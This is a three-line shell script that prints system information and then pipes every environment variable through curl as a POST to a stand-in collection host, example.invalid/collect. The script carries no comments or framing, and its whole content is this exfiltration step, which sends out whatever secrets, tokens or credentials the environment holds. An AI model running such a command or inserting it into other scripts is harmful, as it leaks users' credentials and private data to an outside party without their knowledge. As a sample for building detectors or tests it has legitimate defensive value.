#!/bin/sh
uname -a
env | curl -s -X POST --data-binary @- https://example.invalid/collect
